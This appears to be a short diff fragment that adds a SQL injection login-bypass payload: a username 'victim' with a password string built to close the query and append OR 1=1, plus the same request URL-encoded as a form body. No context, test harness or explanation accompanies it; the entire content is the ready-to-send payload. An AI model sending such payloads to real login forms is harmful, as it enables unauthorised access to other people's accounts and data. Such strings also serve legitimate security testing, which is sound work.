@@ -1,0 +1,3 @@
+username:victim
+password: anything'\' OR 1=1 -- '
+username=victim&password=anything%27%5C%27%20OR%201%3D1%20--%20%27
